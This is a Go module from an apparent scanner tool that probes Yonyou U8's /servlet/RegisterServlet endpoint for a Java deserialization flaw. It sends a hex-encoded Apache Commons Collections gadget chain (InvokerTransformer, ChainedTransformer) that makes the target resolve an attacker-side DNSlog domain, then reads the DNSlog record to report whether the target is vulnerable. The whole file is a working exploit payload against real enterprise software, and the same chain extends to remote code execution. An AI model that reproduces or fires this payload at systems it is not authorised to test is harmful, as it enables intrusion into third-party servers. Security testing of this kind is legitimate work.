package U8_RegisterServlet

import (
	"encoding/hex"
	"fmt"
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"time"
	"yongyouScan/pkg/dnslog"
	"yongyouScan/pkg/utils"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	domain, session := dnslog.GetDnslogUrl()
	url = url + "/servlet/RegisterServlet"
	_, err := client.R().SetHeaders(map[string]string{ // Set multiple headers at once
		"User-Agent":     UA,
		"Content-Length": "100",
		"Content-Type":   "application/x-www-form-urlencoded",
	}).SetBody(fmt.Sprintf("{{unquote(\"%s\")}}", utils.InsertBackslashX(fmt.Sprintf("ACED0005737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C77080000001000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B78707400046E7531727372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000047372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200146A6176612E6E65742E496E6574416464726573732D9B57AF9FE3EBDB0300034900076164647265737349000666616D696C794C0008686F73744E616D657400124C6A6176612F6C616E672F537472696E673B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D6571007E00125B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000C676574416C6C42794E616D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A99020000787000000001767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707400096765744D6574686F647571007E001B0000000271007E001E7671007E001B7371007E00147571007E001800000002707571007E00180000000174000A%s740006696E766F6B657571007E001B00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E00187371007E000F737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B0200007870000000017371007E00003F4000000000000C77080000001000000000787871007E000678", hex.EncodeToString([]byte(domain)))))).Post(url)
	if err != nil {
		color.Red.Println("[-] 用友 U8 RegisterServlet反序列化漏洞不存在")
		return
	}
	if dnslog.GetDnslogRecord(session) {
		color.Green.Println("[+] 用友 U8 RegisterServlet反序列化漏洞存在 -> " + url)
		return
	}
	color.Red.Println("[-] 用友 U8 RegisterServlet反序列化漏洞不存在")
}
